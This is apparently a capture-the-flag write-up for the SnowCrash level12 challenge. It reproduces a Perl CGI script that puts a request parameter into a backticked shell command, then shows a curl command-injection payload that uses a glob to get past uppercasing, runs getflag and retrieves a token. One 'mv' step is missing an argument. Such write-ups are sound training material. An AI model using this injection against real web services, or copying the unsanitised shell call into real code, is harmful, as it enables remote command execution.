# CTF Report — Level12 Perl CGI Exploitation (English)

---

## Overview

This report records the exact, unmodified steps you used to exploit `level12.pl` (a Perl CGI on `localhost:4646`) to run `getflag` and retrieve the token. All commands, payloads and outputs are preserved exactly as provided.

---

## Files (as shown)

**`level12.pl`**

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

**`a.sh`**

```bash
getflag > /tmp/mami
```

---

## Steps (verbatim)

```
level12@SnowCrash:~$ ls
a.sh  level12.pl
level12@SnowCrash:~$ cat level12.pl
[...file contents shown above...]
level12@SnowCrash:~$ cat a.sh
getflag > /tmp/mami
level12@SnowCrash:~$ mv /tmp/A
level12@SnowCrash:~$ curl "localhost:4646?x=\`/*/A\`"
..level12@SnowCrash:~$ cat /tmp/mami
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

---

## Observed token

```
g1qKMiRpXf53AWhDaU7FEkczr
```

---

## Notes

* The CGI script calls `egrep` on `/tmp/xd` using a transformed version of the `x` parameter, then prints `.` or `..` based on the boolean result.
* Your payload invoked the `getflag` wrapper (`a.sh` → writes to `/tmp/mami`) and the resulting token was read from `/tmp/mami`.
* Everything above is kept exactly as you executed it; no commands, outputs, or results were changed.
